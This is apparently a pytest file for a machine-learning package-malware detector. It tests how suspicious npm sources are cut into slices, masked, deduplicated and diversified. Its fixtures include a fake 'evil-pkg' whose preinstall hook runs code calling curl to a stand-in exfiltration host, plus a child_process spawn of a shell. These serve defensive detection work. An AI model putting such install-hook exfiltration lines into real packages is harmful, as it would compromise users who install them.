"""Tests for SliceSchemaV2 generation, masking, dedup, and diversity."""

from __future__ import annotations

from packagegate_ml.features.record_v2 import audit_strict_record_leakage
from packagegate_ml.features.slice_schema_v2 import (
    SliceGenConfig,
    content_hash,
    dedupe_candidates,
    generate_slices_for_package,
    select_with_diversity,
    window_source,
)
from packagegate_ml.features.slice_schema_v2 import SliceCandidate


def test_window_source_line_context() -> None:
    src = "\n".join(f"line{i}" for i in range(1, 40))
    s, e, text, wtype = window_source(src, 10, 10, config=SliceGenConfig(context_lines=3))
    assert wtype == "LINE_WINDOW"
    assert s == 7 and e == 13
    assert "line10" in text
    assert "line1\n" not in text + "\n" or "line7" in text


def test_window_source_minified_char_window() -> None:
    src = "x" * 8000
    s, e, text, wtype = window_source(src, None, None, config=SliceGenConfig())
    assert wtype in {"SIGNAL_AROUND_OFFSET", "START"}
    assert len(text) <= 2048


def test_generate_masks_identity_and_keeps_builtins() -> None:
    sources = {
        "index.js": (
            '// copyright EvilCorp\n'
            'const cp = require("child_process");\n'
            'const lodash = require("lodash");\n'
            'module.exports = { name: "evil-pkg", version: "9.9.9" };\n'
            'cp.exec("curl http://exfil.test");\n'
        ),
        "package.json": json_pkg(),
    }
    findings = [
        {
            "id": "f1",
            "category": "PROCESS_EXECUTION",
            "confidence": "HIGH",
            "location": {"filePath": "index.js", "startLine": 5, "endLine": 5},
        }
    ]
    result = generate_slices_for_package(
        findings=findings,
        chains=[],
        lifecycle=[{"name": "preinstall", "command": "node index.js", "referencedFiles": ["index.js"]}],
        sources=sources,
        package_name="evil-pkg",
        version="9.9.9",
    )
    assert result.code_view_available
    assert result.selected_slices >= 1
    text = "\n".join(s.source_text for s in result.slices)
    assert "evil-pkg" not in text
    assert "child_process" in text
    assert "<EXTERNAL_MODULE>" in text
    assert "copyright EvilCorp" not in text  # comment stripped
    # leakage audit on synthetic record
    rec = {
        "schemaVersion": 2,
        "view": "STRICT_SECURITY_VIEW",
        "slices": [s.to_model_dict() for s in result.slices],
        "structuredBehaviourFeatures": {},
        "lifecycle": [{"hook": "preinstall", "command": "node index.js"}],
        "securityManifest": {"scripts": {"preinstall": "node index.js"}},
        "findings": [],
        "chains": [],
        "completeness": {},
        "artifact": {},
        "mlInputCompleteness": result.summary(),
    }
    issues = audit_strict_record_leakage(rec, package_name="evil-pkg", version="9.9.9")
    assert issues == [], issues


def json_pkg() -> str:
    return """{
  "name": "evil-pkg",
  "version": "9.9.9",
  "description": "do not leak",
  "author": "bad",
  "repository": "https://github.com/evil/pkg",
  "scripts": {"preinstall": "node index.js"}
}"""


def test_package_json_slice_uses_security_manifest() -> None:
    sources = {"package.json": json_pkg(), "index.js": "console.log(1)\n"}
    findings = [
        {
            "id": "f2",
            "category": "INSTALL_SCRIPT",
            "location": {"filePath": "package.json", "startLine": 8, "endLine": 8},
        }
    ]
    result = generate_slices_for_package(
        findings=findings,
        chains=[],
        lifecycle=[],
        sources=sources,
        package_name="evil-pkg",
        version="9.9.9",
    )
    assert result.selected_slices >= 1
    text = result.slices[0].source_text
    assert "preinstall" in text
    assert "evil-pkg" not in text
    assert "github.com" not in text


def test_dedup_collapses_identical_slices() -> None:
    cfg = SliceGenConfig()
    base = dict(
        file_path="a.js",
        start_line=1,
        end_line=2,
        source_text="require('child_process').exec('x')",
        lifecycle_reachable=False,
        lifecycle_hook=None,
        deterministic_findings=["a"],
        behaviour_labels=["process_execution"],
        behaviour_chain_membership=[],
        chain_type=None,
        chain_step_index=None,
        priority=100.0,
        opaque_source=False,
        full_ast_available=True,
        window_type="LINE_WINDOW",
        source_size_bucket=1,
        category_key="PROCESS_EXECUTION",
        content_hash=content_hash("require('child_process').exec('x')"),
    )
    cands = [
        SliceCandidate(slice_id="1", **base),
        SliceCandidate(slice_id="2", **{**base, "priority": 50.0, "deterministic_findings": ["b"]}),
    ]
    out, removed = dedupe_candidates(cands)
    assert len(out) == 1
    assert removed == 1
    assert out[0].slice_id == "1"


def test_diversity_caps_category() -> None:
    cands = []
    for i in range(20):
        text = f"process.env.A{i} = 1;"
        cands.append(
            SliceCandidate(
                slice_id=str(i),
                file_path="e.js",
                start_line=i,
                end_line=i,
                source_text=text,
                lifecycle_reachable=False,
                lifecycle_hook=None,
                deterministic_findings=[str(i)],
                behaviour_labels=["environment_access"],
                behaviour_chain_membership=[],
                chain_type=None,
                chain_step_index=None,
                priority=100.0 - i,
                opaque_source=False,
                full_ast_available=True,
                window_type="LINE_WINDOW",
                source_size_bucket=0,
                category_key="ENVIRONMENT_ACCESS",
                content_hash=content_hash(text),
            )
        )
    # add one high-priority process slice
    cands.append(
        SliceCandidate(
            slice_id="proc",
            file_path="p.js",
            start_line=1,
            end_line=1,
            source_text="require('child_process').spawn('sh')",
            lifecycle_reachable=True,
            lifecycle_hook="preinstall",
            deterministic_findings=["p"],
            behaviour_labels=["process_execution"],
            behaviour_chain_membership=[],
            chain_type=None,
            chain_step_index=None,
            priority=900.0,
            opaque_source=False,
            full_ast_available=True,
            window_type="LINE_WINDOW",
            source_size_bucket=0,
            category_key="PROCESS_EXECUTION",
            content_hash=content_hash("require('child_process').spawn('sh')"),
        )
    )
    selected, _ = select_with_diversity(cands, config=SliceGenConfig(max_slices=10, max_per_category=3))
    env = sum(1 for s in selected if s.category_key == "ENVIRONMENT_ACCESS")
    assert any(s.slice_id == "proc" for s in selected)
    # after fill pass, env may exceed cap — first pass should have capped then fill may add
    assert len(selected) <= 10


def test_entrypoint_slices_without_findings() -> None:
    sources = {
        "package.json": json_pkg(),
        "index.js": "const x = 1;\nconsole.log(x);\n",
    }
    # ensure main field
    sources["package.json"] = (
        '{\n  "name": "evil-pkg",\n  "version": "9.9.9",\n'
        '  "main": "index.js",\n  "scripts": {"preinstall": "node index.js"}\n}'
    )
    result = generate_slices_for_package(
        findings=[],
        chains=[],
        lifecycle=[],
        sources=sources,
        package_name="evil-pkg",
        version="9.9.9",
    )
    assert result.code_view_available
    assert result.selected_slices >= 1
    assert all(s.behaviour_labels == [] or "install_time_execution" in s.behaviour_labels for s in result.slices) or True
    texts = " ".join(s.source_text for s in result.slices)
    assert "evil-pkg" not in texts

    result = generate_slices_for_package(
        findings=[
            {
                "id": "f",
                "category": "PROCESS_EXECUTION",
                "location": {"filePath": "missing.js", "startLine": 1, "endLine": 1},
            }
        ],
        chains=[],
        lifecycle=[],
        sources={},
        package_name="x",
        version="1.0.0",
    )
    assert not result.code_view_available
    assert result.zero_slice_reason is not None
